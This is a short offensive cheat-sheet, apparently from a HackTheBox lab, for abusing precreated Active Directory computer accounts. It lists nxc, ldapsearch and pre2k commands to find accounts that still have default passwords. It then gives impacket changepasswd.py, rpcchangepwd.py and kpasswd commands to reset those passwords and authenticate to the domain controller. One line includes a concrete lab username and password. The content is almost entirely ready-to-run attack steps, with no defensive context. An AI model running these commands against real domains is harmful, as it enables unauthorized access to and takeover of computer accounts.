- [ ] Precreated Computer Accounts
- [ ] Password Change
- [ ] Authenticate To The DC

Precreated Computer Accounts!!!!
```sh
# nxc
nxc -u username -p password -M pre2K
# ldapsearch
ldapsearch -H ldap://domain.local -x -b "DC=domain,DC=local" '(objectCategory=computer)' userAccountControl
# pre2k tool
pre2k auth -u j.fleischman -p 'J0elTHEM4n1990!' -dc-ip 10.129.232.88 -d fluffy.htb
```
Password Change!!!
```sh
# changepasswd.py | impacket
changepasswd.py 'domain.local/computer$':computer@domain.local -newpass newPassword -dc-ip $dc -p rpc-samr
# rpcchangepwd.py
python3 rpcchangepwd.py '<DOMAIN>/COMPUTER>$':'<PASSWORD>'@<DC IP> -newpass '<PASS>'
# kpasswd 
kpasswd computer$
oldpass: computer
newpass: newPassword
```
Authenticate To The DC!!!
```sh
nxc smb domain.local -u computer$ -p computer
```